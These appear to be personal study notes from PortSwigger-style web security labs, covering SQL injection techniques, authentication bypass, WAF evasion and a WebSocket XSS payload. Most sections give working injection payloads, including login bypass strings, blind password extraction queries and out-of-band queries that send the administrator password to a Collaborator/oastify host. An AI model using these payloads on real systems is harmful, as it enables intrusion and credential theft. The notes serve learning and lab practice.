# SQL Injection Notes

> **SQL Injection** tricks the backend database into executing attacker-controlled queries by injecting malicious SQL into user-controlled inputs.

---

## Core Techniques

### 1. WHERE Clause Abuse
Bypass filters to reveal hidden/unreleased data:
```sql
' OR 1=1--
```
In URL encoding:
```
'+OR+1=1--
```
Verify response using Burp Repeater.

---

### 2. Login Bypass (Admin Privilege Escalation)
Intercept login request, modify the username field:
```
administrator'--
```
- The `--` comments out the rest of the query (including the password check)
- You are logged in as administrator without knowing the password

---

### 3. Horizontal vs Vertical Privilege Escalation

| Type       | Description                                      |
|------------|--------------------------------------------------|
| Horizontal | Access another user's account at the same level  |
| Vertical   | Access a higher-privileged account (e.g. admin)  |

> A horizontal escalation can become vertical — if you compromise an admin account, you gain admin access.

**Example (parameter tampering):**
```
https://insecure-website.com/myaccount?id=456
```
If `id=456` belongs to an admin, their page may expose their password or privileged functions.

---

### 4. Username Enumeration (Server-Side)

Using **Burp Intruder**:
1. Brute-force usernames — the **shortest response** (or the one returning a different error) is the valid username
2. Then brute-force passwords using the same approach — look for `302` status code

---

### 5. 2FA Bypass
If 2FA prompts on a **new page**, the user is already logged in at that point. Navigate directly to protected paths:
```
/admin/delete?username=carlos
```

---

## UNION-Based Injection

### Finding Number of Columns
Add NULLs until the server returns `200 OK`:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Finding Columns That Accept Strings
Replace each NULL with a string value:
```sql
' UNION SELECT 'abcdef',NULL--
' UNION SELECT NULL,'abcdef'--
```

> **Always check which column can accept string input before extracting data.**

### Concatenating Multiple Columns (Oracle)
Use `||` (pipe) as string concatenation:
```sql
' UNION SELECT username||'~'||password FROM users--
```

### Checking Database Version (Oracle)
```sql
' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--
```

### Confirm Oracle Syntax
```sql
'||(SELECT '' FROM dual)||'
```
`dual` is Oracle-specific. If this works, you're on Oracle.

### Verify a Table Exists (Oracle)
```sql
'||(SELECT '' FROM users WHERE ROWNUM=1)||'
```

---

## Information Schema (Non-Oracle DBs)

### List All Tables
```sql
SELECT * FROM information_schema.tables
```

### List Columns of a Specific Table
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## Comment Syntax by Database

| Database   | Comment Style |
|------------|---------------|
| MySQL      | `--` or `#`   |
| MSSQL      | `--`          |
| Oracle     | `--`          |
| PostgreSQL | `--`          |

> Use `#` as a fallback if `--` fails.

---

## Blind SQL Injection

### Boolean-Based (Conditional Errors)
No visible output — infer data from whether an error occurs.

**Check if username exists:**
```sql
'||(SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- `1=1` → triggers `1/0` error → user exists
- `1=2` → no error

**Check password length:**
```sql
'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Iterate until no error — use Intruder to find exact length (e.g. 20 chars).

**Extract password character by character:**
```sql
'||(SELECT CASE WHEN SUBSTR(password,$pos$,1)='$a$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Set two payload positions: `$pos$` (1–20) and `$a$` (a–z, 0–9). Use **Cluster Bomb** attack type.

---

### Visible Error-Based (CAST Technique)
Cause a type error to leak data in the error message:
```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
Error reveals: `ERROR: invalid input syntax for type integer: "administrator"`

**If character limit is an issue:** delete part of the tracking ID to shorten the query.

**Extract password:**
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

---

### Time-Based Blind (No Error Output)
Use response delay as the signal.

**PostgreSQL:**
```sql
'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
If the response takes ~10 seconds, the condition is true.

**MSSQL:**
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username='Administrator' AND SUBSTRING(Password,1,1)>'m')=1 WAITFOR DELAY '0:0:{delay}'--
```

> `%3B` = `;` (URL encoded)

---

### Out-of-Band (OAST) — Async Queries
Used when the app processes queries asynchronously (separate thread). No visible output or timing difference. Requires **Burp Collaborator**.

**MSSQL (DNS exfiltration):**
```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.YOUR-COLLABORATOR-ID.burpcollaborator.net/a"')--
```

**Oracle (XML + HTTP exfiltration) — Lab 46:**
```
(x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR-ID.oastify.com"> %remote;]>'),'/l')+FROM+dual--)
```

---

## XML/JSON Injection (WAF Bypass)

Some apps accept SQL input embedded in XML or JSON — WAFs often miss these.

Use **XML escape sequences** to obfuscate keywords:
```xml
<stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
(`&#x53;` = `S`)

**Burp Extension: Hackvertor**
Wrap your payload in `@dec_entities` to encode it and bypass WAF detection.

Since there's only one column, concatenate username and password:
```sql
' UNION SELECT username||'~'||password FROM users--
```

---

## WebSockets + XSS
Intercept WebSocket messages in Burp → **Proxy → WebSocket History**

Inject XSS via message body:
```html
<img src=1 onerror='alert(1)'>
```

---

## Authentication Notes

### Cookie-Based Hash (Lab 36)
The remember-me cookie is structured as:
```
base64(username:md5(password))
```

**Burp Intruder payload chain:**
1. Hash: MD5
2. Add prefix: `username:`
3. Encode: Base64

---

## X-Forwarded-For Header

Used to tell backend servers the **original client IP** when behind a proxy/load balancer:
```
X-Forwarded-For: 203.0.113.42
```

> Cannot bypass a VPN — if VPN is in use, the real client IP is never exposed.

---

## Prevention

> Prevent SQL injection by using **parameterised queries (prepared statements)** — treat user input strictly as data, never as executable SQL.

---

## Key Encoding Reference

| Encoded | Character |
|---------|-----------|
| `%27`   | `'`       |
| `%3F`   | `?`       |
| `%3D`   | `=`       |
| `%25`   | `%`       |
| `%3A`   | `:`       |
| `%3C`   | `<`       |
| `%3B`   | `;`       |

---

## Related Topics
- [[XSS Notes — PortSwigger]]
- [[Burp Suite — Intruder & Repeater]]
- [[Authentication Vulnerabilities]]
- [[Privilege Escalation]]
